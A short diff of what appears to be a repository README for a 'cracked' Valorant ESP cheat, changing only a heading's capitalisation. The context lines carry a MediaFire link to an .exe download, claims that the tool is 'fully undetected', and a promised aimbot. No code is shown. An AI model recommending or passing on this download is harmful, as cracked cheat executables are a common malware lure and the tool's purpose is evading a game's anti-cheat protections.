@@ -8,7 +8,7 @@
 
 > - [Click Here For Download](https://www.mediafire.com/file/imk9aheylf4eeem/Valorant_ESP_Cr4ckedByKemmDevs.exe/file)  
 
-## FEATURES
+## Features
 > - ESP is Fully customizable
 > - Fully undetected Software
 > - Update the software for soon (I will add an aimbot)
